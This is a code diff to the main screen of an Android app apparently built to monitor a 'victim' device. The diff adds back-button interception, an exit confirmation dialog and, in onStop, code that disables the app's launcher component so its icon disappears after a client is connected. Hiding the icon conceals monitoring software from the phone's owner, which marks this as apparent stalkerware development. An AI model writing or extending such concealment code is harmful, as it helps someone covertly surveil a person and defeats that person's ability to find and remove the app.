@@ -1,12 +1,16 @@
 package com.theah64.xrob;
 
 import android.Manifest;
+import android.app.LauncherActivity;
+import android.content.ComponentName;
+import android.content.DialogInterface;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.os.Build;
 import android.support.annotation.NonNull;
 import android.support.v7.app.AppCompatActivity;
 import android.os.Bundle;
+import android.util.Log;
 import android.view.View;
 import android.widget.EditText;
 import android.widget.Toast;
@@ -60,6 +64,12 @@ public class MainActivity extends AppCompatActivity {
 
     }
 
+    @Override
+    public void onBackPressed() {
+        Log.d(X, "Backbutton press intercepted");
+        confirmActivityClose();
+    }
+
     private void connectClientVictim() {
 
         final String clientCode = etClientCode.getText().toString();
@@ -105,7 +115,12 @@ public class MainActivity extends AppCompatActivity {
                                     try {
                                         final String message = new APIResponse(jsonResp).getMessage();
                                         etClientCode.setText(null);
-                                        dialogUtils.showSimpleMessage(R.string.Connected, message);
+                                        dialogUtils.showSimpleMessage(R.string.Connected, message, new DialogInterface.OnDismissListener() {
+                                            @Override
+                                            public void onDismiss(DialogInterface dialogInterface) {
+                                                confirmActivityClose();
+                                            }
+                                        });
                                     } catch (JSONException | APIResponse.APIException e) {
                                         e.printStackTrace();
                                         dialogUtils.showErrorDialog(e.getMessage());
@@ -129,6 +144,22 @@ public class MainActivity extends AppCompatActivity {
 
     }
 
+    private void confirmActivityClose() {
+        //Showing confirmation about the activity close
+        dialogUtils.showConfirmDialog(R.string.Exit, R.string.Exit_message, R.string.YES, new DialogUtils.ClosedQuestionCallback() {
+            @Override
+            public void onYes() {
+                finish();
+            }
+
+            @Override
+            public void onNo() {
+
+            }
+        });
+    }
+
+
     @Override
     public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
         if (requestCode == RQ_CODE_RQ_PERMISSIONS) {
@@ -143,6 +174,12 @@ public class MainActivity extends AppCompatActivity {
 
     @Override
     protected void onStop() {
+
+        //Hiding launcher icon
+        PackageManager p = getPackageManager();
+        ComponentName componentName = new ComponentName(this, MainActivity.class);
+        p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
+
         OkHttpUtils.cancelCall(connectCall);
         super.onStop();
     }
